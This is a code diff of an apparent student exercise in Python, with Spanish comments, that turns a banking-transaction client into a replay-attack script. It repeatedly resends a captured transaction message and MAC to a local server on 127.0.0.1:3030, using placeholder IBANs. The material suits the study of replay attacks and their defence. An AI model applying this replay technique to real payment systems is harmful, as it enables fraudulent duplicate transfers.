@@ -7,7 +7,7 @@ HOST = "127.0.0.1"  # The server's hostname or IP address
 PORT = 3030  # The port used by the server
 
 
-def transaccion(origen, destino, cantidad):
+def attack_replay(origen, destino, cantidad, numero_ataques):
     # Generamos clave privada y publica para pedir con ella la key
     publicKey, privateKey = rsa.newkeys(512)
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -54,33 +54,29 @@ def transaccion(origen, destino, cantidad):
         
     # Los ataques no solo reenvían la info
     # sino que también emulan el handshake de claves inicial
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect((HOST, PORT))
-        
-        print("¡ Ataque 1 !")
-        s.sendall(bytes(str(publicKey_n), 'utf-8'))
-        time.sleep(1)
-        s.sendall(bytes(str(publicKey_e), 'utf-8'))
-        time.sleep(1)
-        s.recv(1024)
-        s.sendall(bytes(mensaje + str(mac), 'utf-8'))
-        data2 = s.recv(1024)
-        print(f"Received:\n"+ data2.decode('utf-8'))
-        time.sleep(3)
+    for n in range(numero_ataques):
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.connect((HOST, PORT))
+            
+            print("¡ Ataque " + str(n+1) + " !")
+            s.sendall(bytes(str(publicKey_n), 'utf-8'))
+            time.sleep(1)
+            s.sendall(bytes(str(publicKey_e), 'utf-8'))
+            time.sleep(1)
+            s.recv(1024)
+            s.sendall(bytes(mensaje + str(mac), 'utf-8'))
+            data2 = s.recv(1024)
+            print(f"Received:\n"+ data2.decode('utf-8'))
+            time.sleep(3)
 
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect((HOST, PORT))
-        print("¡ Ataque 2 !")
-        s.sendall(bytes(str(publicKey_n), 'utf-8'))
-        time.sleep(1)
-        s.sendall(bytes(str(publicKey_e), 'utf-8'))
-        time.sleep(1)
-        s.recv(1024)
-        s.sendall(bytes(mensaje + str(mac), 'utf-8'))
-        data2 = s.recv(1024)
-        print(f"Received:\n"+ data2.decode('utf-8'))
 
 
 cliente_atacado = ("ES00000000000000000000", "ES11111111111111111111", "200")
+cliente_atacado2 = ("ES00000000000000000111", "ES11111111111111111222", "1220000")
 
-transaccion(cliente_atacado[0], cliente_atacado[1], cliente_atacado[2])
+
+attack_replay(cliente_atacado[0], cliente_atacado[1], cliente_atacado[2], 5)
+attack_replay(cliente_atacado[0], cliente_atacado[1], cliente_atacado[2], 4)
+attack_replay(cliente_atacado[0], cliente_atacado[1], cliente_atacado[2], 2)
+attack_replay(cliente_atacado2[0], cliente_atacado2[1], cliente_atacado2[2], 1)
+attack_replay(cliente_atacado2[0], cliente_atacado2[1], cliente_atacado2[2], 2)
